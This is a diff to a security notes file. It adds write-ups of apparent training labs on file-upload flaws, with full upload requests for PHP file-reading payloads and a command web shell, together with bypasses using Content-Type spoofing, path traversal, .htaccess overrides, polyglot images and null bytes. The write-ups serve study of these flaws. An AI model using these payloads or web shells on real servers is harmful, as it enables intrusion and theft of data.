@@ -2291,7 +2291,190 @@ For example in Git, the exploitation technique doesn't require to list the conte
 ### Tool:
 - [FuzzDB Malicious Images](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/file-upload/malicious-images)
 
+
+```
+POST /my-account/avatar HTTP/2
+...
+-----------------------------372082654728426116931381616293
+Content-Disposition: form-data; name="avatar"; filename="test.php"
+Content-Type: text/php
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+-----------------------------372082654728426116931381616293
+...
+```
+![image](https://github.com/user-attachments/assets/9d64d730-dd3d-4309-a589-97f08634ebd2)
+
+Now you can read the value of the file ("G5Bm58gT0NzAmOPLxpe0vR82y4CNT6WY") accessing /avatars/test.php:
+![image](https://github.com/user-attachments/assets/c8f1a76d-9fe6-4800-8483-64fd7fe2eaac)
+
+2. Web shell upload via Content-Type restriction bypass
+
+This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
+If we try the same payload as the previous lab there is an error:
+
+![image](https://github.com/user-attachments/assets/8b2d8cb9-4f01-4c0f-a672-e34e92b1076c)
+
+Changing the Content-Type it is possible to upload the PHP file:
+
+![image](https://github.com/user-attachments/assets/72addbcb-19e8-42de-80d2-2d0f2abccec0)
+
+And read the secret ("wDHZLacPXl2c4B4MZl2j7T3MluCqDzjR"):
+
+![image](https://github.com/user-attachments/assets/0c9ac776-1042-44f0-a09c-7489bede795a)
 ---
+# Web shell upload via path traversal
+
+This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.
+
+It is possible to upload a PHP file:
+
+![image](https://github.com/user-attachments/assets/718e00e3-b216-443f-8ba8-2d1d13306162)
+
+But it does not execute:
+
+![image](https://github.com/user-attachments/assets/f35e355d-e098-4cd7-844a-52907b284450)
+
+To execute the PHP file we will upload it in a different directory using path traversal. We need to encode the payload or it will not work (filename="%2e%2e%2fb.php"):
+
+```
+POST /my-account/avatar HTTP/2
+...
+-----------------------------40637643122628174081089911774
+Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fb.php"
+Content-Type: text/php
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+-----------------------------40637643122628174081089911774
+...
+```
+![image](https://github.com/user-attachments/assets/cc2fd1f9-6644-42b1-8ca8-7e590d00ca8e)
+
+The files is uploaded to the folder “/files” and not “/files/avatars”:
+
+![image](https://github.com/user-attachments/assets/31501f21-992f-4d8a-a10e-47136bbd571f)
+
+# Web shell upload via extension blacklist bypass
+
+This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
+
+New .htaccess file:
+
+```
+-----------------------------230880832739977645353483474501
+Content-Disposition: form-data; name="avatar"; filename=".htaccess"
+Content-Type: application/octet-stream
+
+AddType application/x-httpd-php .l33t
+```
+
+![image](https://github.com/user-attachments/assets/d5c28714-b171-48e5-a810-74d2536b9e66)
+![image](https://github.com/user-attachments/assets/c83a070f-68b8-47cc-a1df-d6a04f3d8512)
+
+Upload Phpinfo file:
+
+```
+-----------------------------230880832739977645353483474501
+Content-Disposition: form-data; name="avatar"; filename="test.l33t"
+Content-Type: application/octet-stream
+
+<?php phpinfo(); ?>
+```
+![image](https://github.com/user-attachments/assets/5e6db857-49a8-4d07-9163-947106d12ca2)
+![image](https://github.com/user-attachments/assets/aa79fc19-eb2b-4d42-8262-e446e80ae7e1)
+
+Upload cmdshell:
+
+```
+-----------------------------230880832739977645353483474501
+Content-Disposition: form-data; name="avatar"; filename="cmd.l33t"
+Content-Type: application/octet-stream
+
+<?php
+if($_GET['cmd']) {
+  system($_GET['cmd']);
+}
+```
+```
+https://0a6000ce04de65cfc3e8c5ac00d700ed.web-security-academy.net/files/avatars/cmd.l33t?cmd=whoami
+```
+
+![image](https://github.com/user-attachments/assets/69e08b6d-cd26-47c4-a075-cf2b672ee0b0)
+![image](https://github.com/user-attachments/assets/958ac36f-b5cf-4d99-b095-a85c6c3c803b)
+
+Read the file:
+
+```
+https://0a6000ce04de65cfc3e8c5ac00d700ed.web-security-academy.net/files/avatars/cmd.l33t?cmd=cat%20/home/carlos/secret
+```
+MzrfsTWgFr82UcKq9wFC0hObV7YSVmlq
+
+![image](https://github.com/user-attachments/assets/f84d4401-892e-4fe9-b111-35151e73a5b3)
+
+# Remote code execution via polyglot web shell upload
+
+This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
+
+I uploaded a real JPG file and deleted as many bytes as possible. This is the least you can send so the server still finds it is a JPG image:
+
+![image](https://github.com/user-attachments/assets/9229ab37-4a90-4343-aed9-1dd065666047)
+
+So we can change everything to update a PHP file like this:
+
+```
+POST /my-account/avatar HTTP/2
+...
+-----------------------------223006367629168816071656253944
+Content-Disposition: form-data; name="avatar"; filename="test.php"
+Content-Type: text/php
+
+<--JPG MAGIC NUMBER-->
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+-----------------------------223006367629168816071656253944
+...
+```
+![image](https://github.com/user-attachments/assets/6f1a71b9-dc4c-488d-93c6-2d24ce0278b3)
+
+And then access /files/avatars/test.php to read the content of the file:
+
+![image](https://github.com/user-attachments/assets/9b414baa-624c-4434-a32b-130969dc2bfb)
+
+# Web shell upload via obfuscated file extension
+
+This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
+
+It is not possible to upload PHP files:
+
+![image](https://github.com/user-attachments/assets/1c5bb867-e2f8-46da-ac5a-4698225248de)
+
+I tried to upload the file with the names:
+
+- “test.php.jpg” but it is interepreted as an image.
+
+- “test.php.” but it is not accepted
+
+- “test%2Ephp” but it is not accepted
+
+The payload “test.php%00.jpg” uploads a file “test.php”:
+
+```
+POST /my-account/avatar HTTP/2
+...
+-----------------------------384622689610978532422380962615
+Content-Disposition: form-data; name="avatar"; filename="test.php%00.jpg"
+Content-Type: text/php
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+-----------------------------384622689610978532422380962615
+...
+```
+![image](https://github.com/user-attachments/assets/04ef5e62-4432-4a73-a19e-65e30ebc82c0)
+
+The file test.php has been created:
+
+![image](https://github.com/user-attachments/assets/74844fe3-56bf-4b97-a45a-811ea081d727)
 
 ## 15. XML External Entity (XXE) Injection
 
